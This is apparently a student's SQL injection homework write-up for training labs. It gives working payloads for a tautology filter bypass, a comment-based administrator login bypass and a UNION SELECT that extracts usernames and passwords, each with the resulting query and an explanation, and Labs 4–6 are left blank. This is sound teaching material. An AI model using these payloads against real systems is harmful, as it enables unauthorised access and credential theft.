# Week 9 – SQL Injection Homework

## Lab 1 – Retrieve Hidden Data


**Payload:** `Gifts' OR 1=1--`

**SQL query produced (approximate):**

SELECT * FROM products
WHERE category = 'Gifts' OR 1=1--' AND released = 1;

**Why it worked:**
The single quote closes the category string. OR 1=1 makes the condition always true, and -- comments out the remaining SQL, including the restriction on unreleased products.

**Result:** Lab solved successfully.

## Lab 2 – Login Bypass

**Payload:** `administrator'--`

**Password entered:** `test123`

**SQL query produced (approximate):**

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test123';
```

**Why it worked:**
The single quote closes the username string, and -- comments out the remaining SQL, including the password check. This allowed me to log in as administrator without knowing the real password.

**Result:** Lab solved successfully.

## Lab 3 – UNION: Retrieve Data from Other Tables


**Payload:** `Gifts' UNION SELECT username,password FROM users--`

**SQL query produced (approximate):**

```sql
SELECT name, description FROM products
WHERE category = 'Gifts'
UNION SELECT username, password FROM users--' AND released = 1;
```

**Why it worked:**
UNION SELECT combined product results with usernames and passwords from the users table. Both queries returned two compatible columns, allowing the database to display the additional data.

**Result:** Lab solved. Retrieved the administrator credentials and successfully logged in.

## Lab 4 – Determine the Number of Columns

**Payload:**

**SQL query produced:**

**Why it worked:**

## Lab 5 – Find a Column Containing Text

**Payload:**

**SQL query produced:**

**Why it worked:**

## Lab 6 – Retrieve Multiple Values in One Column

**Payload:**

**SQL query produced:**

**Why it worked:**